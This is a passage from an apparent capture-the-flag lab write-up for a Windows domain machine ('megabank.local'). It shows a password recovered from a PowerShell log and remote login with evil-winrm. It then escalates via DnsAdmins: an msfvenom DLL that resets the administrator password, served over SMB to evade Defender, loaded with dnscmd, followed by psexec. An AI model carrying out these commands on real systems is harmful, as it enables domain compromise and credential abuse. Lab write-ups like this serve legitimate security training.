+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**</span></code></pre></div>
+<p>We can see that it is a powershell log file. It logged that user <code>ryan</code> used bad syntax and it logged his password <code>Serv3r4Admin4cc123!</code>. Once again, we can log in using evil-winrm.</p>
+<p><code>evil-winrm -i 10.129.223.63 -u ryan -p Serv3r4Admin4cc123!</code></p>
+<h1 id="privilage-escalation">Privilage escalation</h1>
+<p>We can see that ryan has pretty high privilages.</p>
+<div><pre class="hljs"><code>*Evil-WinRM* PS C:\Users\ryan&gt; whoami /groups
+
+<span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span>
+-----------------
+
+<span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>                                 <span class="hljs-keyword">Type</span>             SID                                            <span class="hljs-keyword">Attributes</span>
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-1-0</span>                                        Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">BUILTIN</span>\Users                              Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">BUILTIN</span>\Pre-Windows <span class="hljs-number">2000</span> Compatible Access Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">554</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">BUILTIN</span>\Remote Management Users            Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">580</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">NT</span> AUTHORITY\NETWORK                       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-2</span>                                        Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">NT</span> AUTHORITY\Authenticated Users           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-11</span>                                       Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">NT</span> AUTHORITY\This Organization             Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-15</span>                                       Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">MEGABANK</span>\Contractors                       <span class="hljs-keyword">Group</span>            <span class="hljs-title">S-1-5-21-1392959593-3013219662-3596683436-1103</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">MEGABANK</span>\DnsAdmins                         Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1392959593</span>-<span class="hljs-number">3013219662</span>-<span class="hljs-number">3596683436</span>-<span class="hljs-number">1101</span> Mandatory group, Enabled by default, Enabled group, Local <span class="hljs-keyword">Group</span>
+<span class="hljs-title">NT</span> AUTHORITY\NTLM Authentication           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-64-10</span>                                    Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
+<span class="hljs-title">Mandatory</span> Label\Medium Mandatory Level     Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span></code></pre></div>
+<p>It is important that he a part of <code>DnsAdmins</code>. It allows users to run <code>dnscmd.exe</code>. We can create a malicious .dll package and run it using dnscmd.exe. Ours DLL will change admin password. Create using msfvenom on host machine .dll file.</p>
+<p><code>msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll &gt; da.dll</code></p>
+<p>We can transfer it using smb, not to trigger Windows Defender.</p>
+<p><code>sudo /home/user/vpy/bin/smbserver.py share ./</code></p>
+<p>Then make the server load our dll on boot by running <code>cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.21\share\da.dll</code>as ryan on victim machine.</p>
+<p><img src="/_resources/c195a3d5f7fa4cb79f3f69cebac45976.png" /></p>
+<p>Finally, we restart the dns.</p>
+<div><pre class="hljs"><code>sc.exe stop dns
+sc.exe <span class="hljs-built_in">start</span> dns</code></pre></div>
+<p>Then we get in using <code>python3 psexec.py megabank.local/administrator@10.129.223.63</code></p>
+<p><img src="/_resources/22cb106ffaf3487e8ece02add94fe884.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
